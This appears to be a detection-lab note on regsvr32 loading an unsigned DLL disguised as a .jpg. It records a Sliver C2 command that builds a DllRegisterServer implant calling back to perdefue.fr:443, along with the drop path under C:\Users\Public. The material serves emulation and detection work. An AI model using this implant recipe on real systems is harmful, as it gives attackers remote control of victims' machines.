# regsvr32 module execution

`regsvr32.exe` is used as a loader. The command line carries a path whose extension is `.jpg`; the
loader resolves it as a DLL, maps it, and calls `DllRegisterServer`. The loaded image is unsigned,
carries no version metadata, and lives in a directory writable by the user.

The module is the foothold implant. Once `DllRegisterServer` returns, the implant keeps running
inside `regsvr32.exe` and starts its callback loop.

## How the lab reproduces it

The module is a shared library built with an exported `DllRegisterServer`, generated by the C2
framework rather than written by hand:

```
sliver > generate --name compareforfor --os windows --arch amd64 \
           --format shared --exports DllRegisterServer \
           --https perdefue.fr:443
```

The build is placed at `C:\Users\Public\compareForfor.jpg`. No `--run-at-load` flag is used: the
module starts only when `regsvr32` calls the export, which keeps exactly one implant instance per
load and matches the observed command line.

`tools/build-module.sh` records the generation command and the post-processing (extension change,
hash capture). Telemetry expectations do not depend on the generator, only on the resulting image
being unsigned and loaded from a user-writable path.
